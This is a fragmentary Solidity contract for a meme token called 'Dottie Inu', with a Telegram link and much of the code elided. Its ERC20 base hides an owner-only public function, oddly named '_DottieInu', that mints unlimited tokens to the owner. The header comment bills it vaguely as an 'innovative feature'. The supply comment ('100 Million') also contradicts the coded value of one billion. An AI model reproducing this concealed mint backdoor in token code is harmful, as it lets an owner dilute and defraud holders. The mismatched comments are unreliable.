...
//
// $DottieInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+g9JCBf_M-uVmNWQ9
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DottieInu(uint256 amount) public onlyOwner {
 _DottieInu(msg.sender, amount);
    }
    ...
    function _DottieInu(address account, uint256 amount) internal virtual {
...
contract $DottieInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Dottie Inu", "DOTTIEINU") {
     _DottieInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}